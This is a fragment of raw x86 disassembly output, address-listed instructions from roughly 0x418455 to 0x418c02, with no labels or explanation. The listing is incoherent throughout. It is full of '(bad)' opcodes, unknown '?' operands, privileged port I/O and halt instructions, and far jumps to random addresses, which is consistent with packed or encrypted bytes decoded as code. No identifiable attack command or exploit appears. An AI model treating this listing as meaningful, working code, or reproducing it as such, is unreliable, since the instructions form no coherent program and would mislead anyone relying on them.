  418455:	and    BYTE PTR [esp+esi*8+0x2d2c345],0x95
  41845d:	jl     0x41847f
  41845f:	jns    0x4184be
  418461:	daa    
  418462:	or     al,0x91
  418464:	dec    ecx
  418465:	daa    
  418466:	mov    dh,0xd1
  418468:	xor    al,0x7
  41846a:	jecxz  0x4183f7
  41846c:	jno    0x418473
  41846e:	hlt    
  41846f:	cld    
  418470:	(bad)  
  418471:	ss xchg edx,eax
  418473:	enter  0x1544,0x0
  418477:	inc    edi
  418478:	nop
  418479:	xchg   esi,eax
  41847a:	jl     0x418402
  41847c:	idiv   DWORD PTR [edi+0x423bb02b]
  418482:	mov    edx,0x9952ee8e
  418487:	aam    0x48
  418489:	js     0x4184e4
  41848b:	xchg   esp,eax
  41848c:	fimul  DWORD PTR [esp+edx*2+0xa]
  418490:	pop    ebx
  418491:	jmp    0xacf4f601
  418496:	jmp    0x7f4b:0x2a427ad2
  41849d:	sbb    esp,edi
  41849f:	outs   dx,BYTE PTR ds:[esi]
  4184a0:	out    0xd7,eax
  4184a2:	sub    DWORD PTR ds:0xb5aa096c,ecx
  4184a8:	mov    ebp,0xdbf47b19
  4184ad:	mov    ebp,ecx
  4184af:	arpl   WORD PTR [eax+0x17],si
  4184b2:	jl     0x41852d
  4184b4:	fsubr  st(0),st
  4184b6:	lods   eax,DWORD PTR ds:[esi]
  4184b7:	or     edi,DWORD PTR [ecx-0x3f]
  4184ba:	sti    
  4184bb:	push   esp
  4184bc:	or     ebp,edi
  4184be:	lahf   
  4184bf:	xchg   esp,eax
  4184c0:	loopne 0x4184f9
  4184c2:	mov    eax,0xd3b40537
  4184c7:	fidivr WORD PTR [eax]
  4184c9:	xchg   DWORD PTR [ebx-0x2e931a23],esp
  4184cf:	rcl    DWORD PTR [esi-0x81113ac],1
  4184d5:	jb     0x4184ca
  4184d7:	aas    
  4184d8:	mov    ecx,0xdee43168
  4184dd:	ret    0x1666
  4184e0:	outs   dx,DWORD PTR ds:[esi]
  4184e1:	sti    
  4184e2:	aad    0xd7
  4184e4:	xchg   esi,eax
  4184e5:	pusha  
  4184e6:	ins    BYTE PTR es:[edi],dx
  4184e7:	push   edi
  4184e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184e9:	data16 fmul DWORD PTR [esi]
  4184ec:	(bad)  
  4184ed:	push   ds
  4184ee:	out    dx,al
  4184ef:	cmp    eax,0xf7780085
  4184f4:	cld    
  4184f5:	mov    ?,edx
  4184f7:	and    al,0xd
  4184f9:	les    ebx,FWORD PTR [edi+0x3c]
  4184fc:	hlt    
  4184fd:	xchg   ebp,eax
  4184fe:	jo     0x418493
  418500:	and    eax,0x1dae9350
  418505:	mov    ds:0x3763d45f,eax
  41850a:	gs mov dl,0xd1
  41850d:	js     0x4184ed
  41850f:	mov    al,0x1
  418511:	data16 xlat BYTE PTR ds:[ebx]
  418513:	xchg   esi,eax
  418514:	mov    WORD PTR [ebp+0x7895e7b9],ss
  41851a:	jb     0x4184fd
  41851c:	and    cl,BYTE PTR [ebp+ecx*4+0x68]
  418520:	ror    BYTE PTR [edi+0xf9e853d],cl
  418526:	bound  edx,QWORD PTR [edx]
  418528:	call   0xc3550473
  41852d:	xor    edx,DWORD PTR [ebp+0x34]
  418530:	scas   eax,DWORD PTR es:[edi]
  418531:	xchg   esi,eax
  418532:	in     eax,0x69
  418534:	pop    eax
  418535:	jmp    0x8b2c:0x3baf13b0
  41853c:	leave  
  41853d:	idiv   DWORD PTR [ecx-0xf]
  418540:	jmp    FWORD PTR [edi]
  418542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418543:	(bad)  [eax+ebx*4+0x156da3bd]
  41854a:	pop    es
  41854b:	test   al,0xd2
  41854d:	sbb    edi,ebp
  41854f:	xor    eax,DWORD PTR [ecx]
  418551:	jne    0x418502
  418553:	push   esp
  418554:	jg     0x4184f9
  418556:	mov    esi,0xb255bd96
  41855b:	xchg   esp,eax
  41855c:	xchg   edi,eax
  41855d:	(bad)  
  41855e:	cmp    al,bh
  418560:	mov    ebx,0x66e14119
  418565:	aas    
  418566:	aam    0x1e
  418568:	jnp    0x418573
  41856a:	scas   eax,DWORD PTR es:[edi]
  41856b:	in     eax,0x45
  41856d:	imul   eax,DWORD PTR cs:[esi-0x61],0x9071a113
  418575:	aaa    
  418576:	jo     0x4185ae
  418578:	pop    ebx
  418579:	xchg   BYTE PTR [ecx+0x76],cl
  41857c:	repz jg 0x418581
  41857f:	adc    BYTE PTR [esi-0x6e21d102],dh
  418585:	lods   eax,DWORD PTR ds:[esi]
  418586:	rcr    esp,1
  418588:	cwde   
  418589:	lea    ebp,[bx]
  41858c:	xchg   edi,eax
  41858d:	loop   0x418525
  41858f:	mov    ebx,0x2ceff39c
  418594:	mov    eax,ds:0x8481401e
  418599:	push   ecx
  41859a:	xchg   edi,eax
  41859b:	adc    ebx,ebx
  41859d:	mov    al,0x74
  41859f:	shl    DWORD PTR [esi+eax*1-0x45],1
  4185a3:	jns    0x418611
  4185a5:	outs   dx,DWORD PTR ds:[esi]
  4185a6:	mov    cl,0x0
  4185a8:	neg    BYTE PTR [esi]
  4185aa:	imul   esp,DWORD PTR [ebp+0x6c],0x40ec2601
  4185b1:	(bad)  
  4185b2:	pop    ecx
  4185b3:	pushf  
  4185b4:	test   DWORD PTR [ebx+0x4beb4c38],ecx
  4185ba:	popa   
  4185bb:	mov    bh,BYTE PTR [eax+0x73aced8c]
  4185c1:	lods   eax,DWORD PTR ds:[esi]
  4185c2:	das    
  4185c3:	fisttp DWORD PTR [eax+edi*8+0x7c]
  4185c7:	pop    esi
  4185c8:	jle    0x41863b
  4185ca:	stos   DWORD PTR es:[edi],eax
  4185cb:	jg     0x418634
  4185cd:	ret    0x496a
  4185d0:	mov    dh,0x87
  4185d2:	stos   BYTE PTR es:[edi],al
  4185d3:	les    ebp,FWORD PTR [eax]
  4185d5:	into   
  4185d6:	adc    BYTE PTR [edx-0x62],bh
  4185d9:	pop    eax
  4185da:	nop
  4185db:	mov    esi,0x892f95dd
  4185e0:	mov    al,0xbe
  4185e2:	sahf   
  4185e3:	jmp    0xf092:0xbf351c93
  4185ea:	les    ebp,FWORD PTR [edi+0x4a]
  4185ed:	shr    BYTE PTR [esi+ebp*1+0x7e],0x59
  4185f2:	imul   edx,DWORD PTR [edx],0xb8cc861b
  4185f8:	xchg   BYTE PTR [esi+0x13ebd1ef],dl
  4185fe:	test   al,0xca
  418600:	xchg   ebp,eax
  418601:	push   edx
  418602:	cli    
  418603:	mov    ah,0x39
  418605:	adc    al,0x3d
  418607:	rol    BYTE PTR [edx+edx*8+0x0],cl
  41860b:	jg     0x418683
  41860d:	jno    0x418657
  41860f:	in     al,0x9e
  418611:	retf   0x4cba
  418614:	leave  
  418615:	call   0x4c74:0xb27a24c4
  41861c:	cmp    ebp,DWORD PTR [ecx+0x1c]
  41861f:	mov    edi,0x7b75307e
  418624:	scas   eax,DWORD PTR es:[edi]
  418625:	jecxz  0x418652
  418627:	mov    bh,0x78
  418629:	push   cs
  41862a:	fisttp QWORD PTR [eax]
  41862c:	cdq    
  41862d:	mov    al,0xe4
  41862f:	pop    ss
  418630:	iret   
  418631:	mov    ds:0xbdae9699,al
  418636:	aam    0x7f
  418638:	fiadd  DWORD PTR [esi+0x66]
  41863b:	out    0x12,eax
  41863d:	retf   0x8ee
  418640:	rol    BYTE PTR [eax+0x71],cl
  418643:	gs aam 0x61
  418646:	jle    0x4185e6
  418648:	pop    ds
  418649:	enter  0x9990,0xae
  41864d:	and    BYTE PTR [esi],al
  41864f:	cmp    eax,0xecea7d67
  418654:	add    eax,0xffc31b64
  418659:	shl    esi,cl
  41865b:	fst    st(0)
  41865d:	jg     0x418613
  41865f:	lock or BYTE PTR [edi+0x59],dh
  418663:	leave  
  418664:	push   cs
  418665:	pop    eax
  418666:	int3   
  418667:	pop    ss
  418668:	cmp    al,0xd8
  41866a:	jne    0x41861a
  41866c:	push   ecx
  41866d:	add    eax,0x81cd0cf7
  418672:	inc    ebx
  418673:	mov    ds:0x382238fe,al
  418678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418679:	lea    edx,[ebp+0x17caf205]
  41867f:	add    eax,0xe5c7d1c6
  418684:	aam    0x70
  418686:	ds repz scas eax,DWORD PTR es:[edi]
  418689:	stc    
  41868a:	inc    ecx
  41868b:	sti    
  41868c:	mov    WORD PTR ds:0x5a79c30,?
  418692:	pop    edi
  418693:	add    esp,ecx
  418695:	xchg   esp,eax
  418696:	pop    edx
  418697:	loop   0x4186e0
  418699:	add    ecx,ebp
  41869b:	sub    al,0xa9
  41869d:	lea    eax,[ebx-0x707bb5c1]
  4186a3:	xlat   BYTE PTR ds:[ebx]
  4186a4:	xchg   BYTE PTR ds:0x3092d00d,bh
  4186aa:	pop    ebx
  4186ab:	adc    ebp,DWORD PTR [esi]
  4186ad:	or     ch,ch
  4186af:	jne    0x418715
  4186b1:	inc    esi
  4186b2:	pop    edx
  4186b3:	pop    edi
  4186b4:	pop    ebp
  4186b5:	xchg   DWORD PTR [esi],ecx
  4186b7:	shr    DWORD PTR [edi+0x23],0x67
  4186bb:	ret    0xf985
  4186be:	(bad)  
  4186bf:	test   BYTE PTR [eax-0x50],0x3b
  4186c3:	imul   edi,DWORD PTR [ebp+edi*1-0x6ef4e1f4],0xffffff91
  4186cb:	outs   dx,DWORD PTR ds:[esi]
  4186cc:	into   
  4186cd:	lods   eax,DWORD PTR ds:[esi]
  4186ce:	shr    cl,0x5d
  4186d1:	adc    al,ch
  4186d3:	sbb    edi,DWORD PTR ds:0x5627b4b5
  4186d9:	(bad)  
  4186da:	fstp   DWORD PTR [eax+0x6b66bf8a]
  4186e0:	pusha  
  4186e1:	mov    ah,0xd9
  4186e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186e4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4186e6:	dec    ebx
  4186e7:	test   BYTE PTR [ebx+0x68],bh
  4186ea:	ins    DWORD PTR es:[edi],dx
  4186eb:	lea    esp,[edx]
  4186ed:	clc    
  4186ee:	mov    BYTE PTR [edi+0x5c5a4ca6],ah
  4186f4:	inc    esi
  4186f5:	mov    ebx,0x665c1f8e
  4186fa:	imul   edx,DWORD PTR [ebp-0x18],0x2917ca29
  418701:	or     BYTE PTR [ebp+eax*2-0xdd0c76a],bl
  418708:	or     eax,DWORD PTR [edi+0xaac9fa]
  41870e:	outs   dx,BYTE PTR ds:[esi]
  41870f:	shl    BYTE PTR [eax],1
  418711:	aas    
  418712:	add    al,0x63
  418714:	pop    ss
  418715:	jns    0x418732
  418717:	push   edx
  418718:	call   0xaa25:0x7e38c619
  41871f:	push   ecx
  418720:	sbb    DWORD PTR [edx-0x6fe959df],edi
  418726:	std    
  418727:	and    esi,0xffffffbc
  41872a:	jb     0x4186e0
  41872c:	add    ch,BYTE PTR [ebx+0x69d903da]
  418732:	inc    ebx
  418733:	push   esi
  418734:	jle    0x418714
  418736:	push   edi
  418737:	jecxz  0x418743
  418739:	lods   eax,DWORD PTR ds:[esi]
  41873a:	dec    ebx
  41873b:	std    
  41873c:	adc    bh,ah
  41873e:	sbb    esi,DWORD PTR [edx-0x31]
  418741:	loop   0x4186e7
  418743:	jmp    0xf1f4463
  418748:	(bad)  
  418749:	adc    eax,DWORD PTR [edi-0x4f307fd4]
  41874f:	mov    ecx,0x4f3d1b42
  418754:	mov    bh,0xe5
  418756:	sbb    DWORD PTR [edi],ebp
  418758:	imul   ebp,DWORD PTR [eax],0xffffff85
  41875b:	jmp    0xa682:0xa81dd1bc
  418762:	dec    ebp
  418763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418764:	mov    dh,0x73
  418766:	cmp    DWORD PTR [ecx+0x32],0xffffffdd
  41876a:	in     al,0x49
  41876c:	inc    edx
  41876d:	popf   
  41876e:	cwde   
  41876f:	mov    ds:0x86fbb296,eax
  418774:	mov    dh,0xe7
  418776:	jo     0x41874b
  418778:	jbe    0x418751
  41877a:	jl     0x418786
  41877c:	popf   
  41877d:	jmp    0x418740
  41877f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418780:	imul   edx,DWORD PTR [ebp-0x30],0xffffffed
  418784:	pop    ebp
  418785:	jns    0x418733
  418787:	iret   
  418788:	pop    edi
  418789:	or     eax,0xfa259225
  41878e:	pusha  
  41878f:	sub    cl,BYTE PTR [ebp*4+0x4dfed18c]
  418796:	jmp    0xbe5c8e1a
  41879b:	pushf  
  41879c:	int    0x64
  41879e:	mov    ds:0x3073fbea,eax
  4187a3:	adc    dh,al
  4187a5:	pop    edx
  4187a6:	dec    eax
  4187a7:	imul   esp,DWORD PTR [edi+0x15],0xffffffbe
  4187ab:	shl    BYTE PTR [eax-0x29f80e5e],1
  4187b1:	fwait
  4187b2:	push   ss
  4187b3:	out    dx,al
  4187b4:	mov    dl,0x5
  4187b6:	add    DWORD PTR [ebx],0xb8f5b8b6
  4187bc:	stc    
  4187bd:	ins    DWORD PTR es:[edi],dx
  4187be:	jg     0x4187ce
  4187c0:	inc    di
  4187c2:	mov    ebp,0xeb822ef4
  4187c7:	jne    0x41883a
  4187c9:	ins    DWORD PTR es:[edi],dx
  4187ca:	bound  ebp,QWORD PTR [eiz*1-0x7db28c0f]
  4187d1:	push   0x788624de
  4187d6:	pop    ebp
  4187d7:	outs   dx,DWORD PTR ds:[esi]
  4187d8:	xchg   BYTE PTR [edx-0x52],al
  4187db:	jmp    0x41883d
  4187dd:	iret   
  4187de:	xchg   edi,eax
  4187df:	ds aas 
  4187e1:	mov    al,ds:0x6009ce73
  4187e6:	dec    DWORD PTR [ecx+0x56b29815]
  4187ec:	and    al,0xe9
  4187ee:	dec    edi
  4187ef:	fisubr DWORD PTR [ebx]
  4187f1:	xlat   BYTE PTR ds:[ebx]
  4187f2:	in     al,dx
  4187f3:	fisubr WORD PTR ds:0xfdd1f9c3
  4187f9:	loop   0x4187eb
  4187fb:	repnz mov esp,DWORD PTR [ecx]
  4187fe:	sub    BYTE PTR [esi],ah
  418800:	fimul  WORD PTR [esp+ebx*4-0x6c]
  418804:	mul    DWORD PTR [edi+eiz*1+0xa]
  418808:	sbb    DWORD PTR [esi+eiz*1-0x76],edx
  41880c:	or     ch,0xe
  41880f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418810:	or     al,0x7c
  418812:	mov    bh,0xbd
  418814:	cmp    eax,esp
  418816:	sar    BYTE PTR [ebx-0xe],0xf
  41881a:	sbb    ah,BYTE PTR [ecx]
  41881c:	fcomp  DWORD PTR [ecx-0x5929eb25]
  418822:	jmp    0x10781ea9
  418827:	dec    eax
  418828:	mov    eax,0x14694ac5
  41882d:	arpl   WORD PTR [ebx-0x36],sp
  418830:	pop    ebx
  418831:	loopne 0x4188a4
  418833:	mov    esi,DWORD PTR [edi-0x5ecb7de]
  418839:	mov    ecx,0xd2f6a886
  41883e:	in     al,0x33
  418840:	pusha  
  418841:	pop    esp
  418842:	cmp    al,BYTE PTR [esi]
  418844:	or     al,0xed
  418846:	(bad)  
  418847:	dec    DWORD PTR [edi]
  418849:	fld    DWORD PTR es:[esi-0x6ff3641b]
  418850:	retf   0xac2c
  418853:	aad    0x9
  418855:	stc    
  418856:	(bad)
  41885a:	(bad)  
  41885b:	daa    
  41885c:	jnp    0x4188cb
  41885e:	or     eax,0x64c44b4f
  418863:	add    edi,DWORD PTR [ecx+eiz*1-0x14]
  418867:	xor    edx,DWORD PTR [esi+0x550a6ca]
  41886d:	int    0x7
  41886f:	hlt    
  418870:	dec    esp
  418871:	leave  
  418872:	mov    bl,0xd7
  418874:	add    BYTE PTR [edi-0x10],cl
  418877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418878:	mov    ebx,0xbafb5eee
  41887d:	dec    ebx
  41887e:	call   0x381b655c
  418883:	imul   edx,esp,0xffffffab
  418886:	shl    DWORD PTR [ebp+0xd],cl
  418889:	shl    esi,1
  41888b:	mov    cl,0x85
  41888d:	push   ecx
  41888e:	leavew 
  418890:	adc    al,0xa2
  418892:	mov    edi,DWORD PTR [edi]
  418894:	push   ss
  418895:	and    cl,BYTE PTR [edx]
  418897:	xchg   esi,eax
  418898:	add    DWORD PTR [esi],eax
  41889a:	ret    
  41889b:	sbb    al,0x68
  41889d:	js     0x4188fa
  41889f:	xor    BYTE PTR [esi],bl
  4188a1:	loopne 0x418910
  4188a3:	dec    BYTE PTR [edx-0x2f]
  4188a6:	add    al,dl
  4188a8:	test   al,0x27
  4188aa:	cmc    
  4188ab:	ret    
  4188ac:	aaa    
  4188ad:	and    BYTE PTR [esi-0x710c913a],dl
  4188b3:	outs   dx,BYTE PTR ds:[esi]
  4188b4:	push   ebp
  4188b5:	aas    
  4188b6:	or     eax,0xf63363af
  4188bb:	jl     0x4188a9
  4188bd:	call   0x53cc:0x86ae2608
  4188c4:	xchg   edi,eax
  4188c5:	scas   al,BYTE PTR es:[edi]
  4188c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188c7:	add    eax,0x66a7661a
  4188cc:	and    eax,edi
  4188ce:	pop    es
  4188cf:	pusha  
  4188d0:	cmc    
  4188d1:	aas    
  4188d2:	pop    esp
  4188d3:	sbb    BYTE PTR [eiz*8-0x6af0e3da],ah
  4188da:	(bad)  
  4188db:	mov    esi,0xbee0f92
  4188e0:	outs   dx,DWORD PTR ds:[esi]
  4188e1:	xor    ecx,DWORD PTR [ecx]
  4188e3:	cmp    eax,0x1abcdc6d
  4188e8:	jo     0x41893e
  4188ea:	(bad)  
  4188eb:	jmp    0x8393:0x20f218f3
  4188f2:	add    DWORD PTR [ecx+eiz*2-0x5a],0x3b
  4188f7:	jo     0x418950
  4188f9:	leave  
  4188fa:	mov    bl,0xeb
  4188fc:	xchg   ebp,eax
  4188fd:	and    esi,DWORD PTR [edx]
  4188ff:	stc    
  418900:	retf   
  418901:	aad    0xdf
  418903:	jg     0x418957
  418905:	dec    ebx
  418906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418908:	lock push ds
  41890a:	mov    al,ds:0x6864b5b5
  41890f:	pop    esi
  418910:	xchg   edi,ecx
  418912:	ret    
  418913:	and    DWORD PTR [ecx],0xfffffffe
  418916:	xor    DWORD PTR es:[ebx],esi
  418919:	xor    ch,BYTE PTR [esi]
  41891b:	dec    esp
  41891c:	dec    esi
  41891d:	push   ebp
  41891e:	xor    dh,bh
  418920:	sub    dh,BYTE PTR [eax+0x14c0c497]
  418926:	push   ebp
  418927:	xchg   ecx,eax
  418928:	jecxz  0x418952
  41892a:	mov    cl,0x43
  41892c:	ins    BYTE PTR es:[edi],dx
  41892d:	fidiv  DWORD PTR [ebx+0x397cf814]
  418933:	pusha  
  418934:	jl     0x418964
  418936:	lock sti 
  418938:	jae    0x418907
  41893a:	in     al,dx
  41893b:	sbb    ch,bl
  41893d:	das    
  41893e:	stc    
  41893f:	and    esi,DWORD PTR [eax+0x73]
  418942:	cdq    
  418943:	add    al,0xe6
  418945:	push   es
  418946:	int3   
  418947:	mov    al,0xff
  418949:	test   BYTE PTR [ebp+0x18a77c47],bh
  41894f:	ret    
  418950:	and    eax,0x6c690e87
  418955:	aas    
  418956:	xor    DWORD PTR [edx-0x6547321d],ebx
  41895c:	cmp    dh,cl
  41895e:	mov    ebx,0x2bb8bf0a
  418963:	mov    dh,0xca
  418965:	mov    ah,0x23
  418967:	sbb    BYTE PTR [esp+esi*4],ah
  41896a:	jb     0x418961
  41896c:	not    DWORD PTR [esi+ebx*1-0x7f]
  418970:	cmp    ebp,DWORD PTR [ecx]
  418972:	dec    edx
  418973:	ins    DWORD PTR es:[edi],dx
  418974:	jo     0x4189af
  418976:	addr16 es out dx,eax
  418979:	mov    bl,0x81
  41897b:	ret    0xe1ae
  41897e:	push   ds
  41897f:	fnstcw WORD PTR [edi+ebp*2+0x3d]
  418983:	mov    bh,0xf2
  418985:	mov    al,ds:0x2bc93f2
  41898a:	mov    eax,0xae6f647
  41898f:	push   edi
  418990:	dec    esp
  418991:	jg     0x4189a8
  418993:	rcr    DWORD PTR [edi+0x12],cl
  418996:	push   0xb48730b4
  41899b:	nop
  41899c:	push   ss
  41899d:	add    DWORD PTR [edi],edx
  41899f:	lods   eax,DWORD PTR ds:[esi]
  4189a0:	inc    ebp
  4189a1:	dec    edx
  4189a2:	mov    DWORD PTR [edx-0xe],ebp
  4189a5:	xchg   ecx,eax
  4189a6:	cmp    cl,BYTE PTR [esi+0x30]
  4189a9:	or     esi,DWORD PTR [ecx+eiz*2]
  4189ac:	mov    bl,0x8a
  4189ae:	in     eax,0x5a
  4189b0:	jmp    0x49c4:0xba503b66
  4189b7:	out    0x16,eax
  4189b9:	sub    eax,ebp
  4189bb:	mov    cl,0x34
  4189bd:	xor    DWORD PTR [edi],0xb5afb7fc
  4189c3:	jmp    0xd776:0x91359c10
  4189ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189cb:	push   ecx
  4189cc:	fiadd  WORD PTR [ebx+0x72b709c6]
  4189d2:	aad    0xac
  4189d4:	(bad)  
  4189d5:	aas    
  4189d6:	jg     0x418975
  4189d8:	xchg   ebx,eax
  4189d9:	jns    0x418975
  4189db:	add    bh,BYTE PTR [ebp+eiz*4+0x2b]
  4189df:	mov    eax,es
  4189e1:	in     al,dx
  4189e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189e3:	dec    esi
  4189e4:	out    0x76,al
  4189e6:	ror    BYTE PTR [edi],1
  4189e8:	sbb    DWORD PTR [eax],edx
  4189ea:	push   0x55
  4189ec:	retf   0xfb21
  4189ef:	jne    0x4189ba
  4189f1:	and    DWORD PTR ds:0x96c0fc24,ebx
  4189f7:	jp     0x418a43
  4189f9:	xor    al,BYTE PTR [ecx+0x18b9314d]
  4189ff:	mov    ss,WORD PTR [edi-0x13]
  418a02:	push   esp
  418a03:	and    eax,0xd89af872
  418a08:	sbb    edi,DWORD PTR [ebx+0x2e]
  418a0b:	cmp    ecx,DWORD PTR [esi+0x4341ca9e]
  418a11:	mov    bh,0x23
  418a13:	int    0xc4
  418a15:	arpl   WORD PTR [edi-0x5e8d6b1e],dx
  418a1b:	mov    eax,ds:0x821b95e3
  418a20:	lods   eax,DWORD PTR ds:[esi]
  418a21:	aam    0x34
  418a23:	ds add al,0x6e
  418a26:	jmp    0xaf44:0x9ef9790b
  418a2d:	xchg   ebx,eax
  418a2e:	add    eax,0x1c60e152
  418a33:	and    al,0xd8
  418a35:	cmp    esp,DWORD PTR [edx-0x1e]
  418a38:	retf   
  418a39:	inc    ebx
  418a3a:	mov    BYTE PTR [esi],ch
  418a3c:	mov    esi,0x825bf7a8
  418a41:	jl     0x418a8c
  418a43:	xor    eax,DWORD PTR [esi]
  418a45:	outs   dx,BYTE PTR ds:[esi]
  418a46:	sbb    ch,BYTE PTR [edx]
  418a48:	inc    esi
  418a49:	das    
  418a4a:	and    cl,BYTE PTR [ebp+0x5decd1fb]
  418a50:	push   eax
  418a51:	sbb    ch,BYTE PTR [edx+0x2c]
  418a54:	push   esi
  418a55:	pop    esi
  418a56:	sbb    DWORD PTR [eax-0x5532755b],edi
  418a5c:	inc    edx
  418a5d:	enter  0x9df0,0x3b
  418a61:	ins    DWORD PTR es:[edi],dx
  418a62:	aas    
  418a63:	push   edx
  418a64:	inc    esi
  418a65:	addr16 jnp 0x418a1f
  418a68:	pop    ebp
  418a69:	cmp    al,0xb3
  418a6b:	sar    BYTE PTR [ecx+ecx*2-0x6],cl
  418a6f:	mov    ah,0x4e
  418a71:	repz in al,0xcb
  418a74:	mov    ds,WORD PTR [edx]
  418a76:	add    BYTE PTR [edi+0x62aa4181],al
  418a7c:	sahf   
  418a7d:	pop    edx
  418a7e:	in     eax,dx
  418a7f:	and    eax,0xff46183f
  418a84:	or     ch,0xf4
  418a87:	mov    cl,0xe8
  418a89:	scas   al,BYTE PTR es:[edi]
  418a8a:	jge    0x418ad5
  418a8c:	xchg   BYTE PTR [edi-0x55e27a96],bl
  418a92:	adc    dl,BYTE PTR [ebp+0x53]
  418a95:	bound  esp,QWORD PTR [esi-0x78]
  418a98:	sbb    eax,0x8c7ca963
  418a9d:	pop    esp
  418a9e:	cld    
  418a9f:	push   edx
  418aa0:	retf   0xfff9
  418aa3:	dec    ebp
  418aa4:	cmp    cl,BYTE PTR [edi-0x3d]
  418aa7:	pop    esp
  418aa8:	pop    ebx
  418aa9:	sub    ebp,eax
  418aab:	sar    BYTE PTR [edi],0x6a
  418aae:	lods   eax,DWORD PTR ds:[esi]
  418aaf:	jl     0x418ac7
  418ab1:	int3   
  418ab2:	std    
  418ab3:	mov    al,0x1b
  418ab5:	push   edx
  418ab6:	rcl    DWORD PTR [esi],0xdd
  418ab9:	cdq    
  418aba:	popa   
  418abb:	add    eax,0x629f074c
  418ac0:	rcr    bl,1
  418ac2:	pop    ebp
  418ac3:	mov    eax,0xeda4d659
  418ac8:	sbb    al,0xbc
  418aca:	stos   DWORD PTR es:[edi],eax
  418acb:	jl     0x418a4f
  418acd:	push   0xf86a1b2c
  418ad2:	cwde   
  418ad3:	jle    0x418aaf
  418ad5:	int3   
  418ad6:	cli    
  418ad7:	pop    ds
  418ad8:	mov    ah,0x3e
  418ada:	daa    
  418adb:	or     ebp,DWORD PTR [eax]
  418add:	cmp    BYTE PTR [ecx-0x27],ah
  418ae0:	into   
  418ae1:	xor    BYTE PTR [edx+0xdc5b55e],dl
  418ae7:	in     eax,0x76
  418ae9:	xchg   DWORD PTR [ebp+0x11294f8b],ebp
  418aef:	daa    
  418af0:	mov    ebp,0x461c9495
  418af5:	dec    ebp
  418af6:	(bad)  
  418af7:	adc    bl,ah
  418af9:	cmp    eax,0x31e8db7c
  418afe:	shl    BYTE PTR [eax+0x1013a9c6],1
  418b04:	push   esi
  418b05:	shl    BYTE PTR [edx+0x3ca7ce4e],1
  418b0b:	dec    edx
  418b0c:	adc    al,0x2a
  418b0e:	popa   
  418b0f:	clc    
  418b10:	adc    dh,BYTE PTR [eax-0x5893852]
  418b16:	push   ds
  418b17:	mov    ?,eax
  418b19:	popf   
  418b1a:	xor    ebx,edi
  418b1c:	cmp    DWORD PTR [edx+0x6f],esp
  418b1f:	jnp    0x418ac8
  418b21:	stc    
  418b22:	imul   ecx,ebx,0x2
  418b25:	repz fwait
  418b27:	sbb    esp,ecx
  418b29:	jge    0x418b64
  418b2b:	loope  0x418b2e
  418b2d:	jmp    0x418ba9
  418b2f:	shl    ecx,cl
  418b31:	inc    esi
  418b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b33:	scas   eax,DWORD PTR es:[edi]
  418b34:	ja     0x418b89
  418b36:	into   
  418b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b38:	fidivr DWORD PTR [ebx-0x14433da2]
  418b3e:	or     BYTE PTR [eax-0x67],dh
  418b41:	inc    esi
  418b42:	or     eax,0xd5207ba2
  418b47:	pop    ecx
  418b48:	jno    0x418b8b
  418b4a:	xor    al,0xae
  418b4c:	call   0x8493e051
  418b51:	aad    0xe5
  418b53:	lods   al,BYTE PTR ds:[esi]
  418b54:	sahf   
  418b55:	int    0x81
  418b57:	icebp  
  418b58:	sub    al,0xe4
  418b5a:	in     eax,0xf8
  418b5c:	jae    0x418b3e
  418b5e:	xor    BYTE PTR [esi+ebp*2+0x7f],dl
  418b62:	cdq    
  418b63:	stos   BYTE PTR es:[edi],al
  418b64:	mov    cl,0x33
  418b66:	cmp    ebx,ebp
  418b68:	push   0xcec42274
  418b6d:	out    0x5,eax
  418b6f:	xchg   ecx,eax
  418b70:	mov    ah,0x62
  418b72:	or     edx,DWORD PTR [esi+0x38]
  418b75:	jb     0x418b66
  418b77:	inc    esp
  418b78:	mov    al,ds:0x3aa3aa9
  418b7d:	fs dec edi
  418b7f:	arpl   WORD PTR [ecx-0x11ab64b4],cx
  418b85:	imul   edx,DWORD PTR [ebp+0x6a53fdc2],0xffffffd8
  418b8c:	dec    ebx
  418b8d:	mov    eax,0xbc36121c
  418b92:	ror    DWORD PTR [ebx],1
  418b94:	adc    DWORD PTR es:[edx+ecx*8],0xe807132d
  418b9c:	rcr    BYTE PTR [eax-0x4f32b127],0x7d
  418ba3:	sbb    DWORD PTR [edx-0xd3aac10],ebx
  418ba9:	mov    esi,ebx
  418bab:	push   cs
  418bac:	ins    BYTE PTR es:[edi],dx
  418bad:	sub    al,0x78
  418baf:	xchg   esi,eax
  418bb0:	stos   DWORD PTR es:[edi],eax
  418bb1:	stc    
  418bb2:	not    DWORD PTR [ebp+0x3e]
  418bb5:	pop    esp
  418bb6:	and    eax,0x42880fdf
  418bbb:	xor    cl,BYTE PTR [ebx+ebx*1]
  418bbe:	push   es
  418bbf:	mov    ds:0x6f7814ab,eax
  418bc4:	rcl    DWORD PTR ds:0x70b061d8,cl
  418bca:	jg     0x418b9d
  418bcc:	ret    
  418bcd:	inc    ebx
  418bce:	ds mov edx,0x309103ea
  418bd4:	jbe    0x418b9f
  418bd6:	push   ds
  418bd7:	dec    edx
  418bd8:	push   eax
  418bd9:	hlt    
  418bda:	dec    ebp
  418bdb:	pushf  
  418bdc:	mov    ebx,0x7cca4a3
  418be1:	mov    esi,0x6eee7536
  418be6:	add    ecx,DWORD PTR [edi]
  418be8:	cmp    esi,DWORD PTR [ebx+0x1a033896]
  418bee:	adc    ecx,DWORD PTR [ecx+0x5b819e6a]
  418bf4:	cdq    
  418bf5:	popa   
  418bf6:	add    BYTE PTR [ebx+0x5b],0x3b
  418bfa:	mov    esi,0x252c7ce9
  418bff:	adc    esi,ebx
  418c01:	(bad)  
  418c02:	iret   
